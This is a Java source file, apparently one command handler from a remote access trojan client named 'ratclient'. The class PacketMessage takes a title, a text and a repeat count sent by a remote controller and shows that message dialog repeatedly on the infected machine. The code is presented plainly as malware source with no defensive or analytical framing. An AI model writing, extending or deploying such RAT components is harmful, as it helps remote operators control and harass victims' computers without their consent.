package ej.ratclient.packet.impl;

import ej.ratclient.packet.PacketType;
import ej.ratclient.packet.Packet;
import javax.swing.JOptionPane;

public class PacketMessage implements PacketType {

    @Override
    public void handlePacket(Packet packet) {
        String title = packet.getString();
        String text = packet.getString();
        int repeat = packet.getInt();
        for (int i = 0; i < repeat; i++) {
            JOptionPane.showMessageDialog(null, text, title, 1);
        }
    }
}
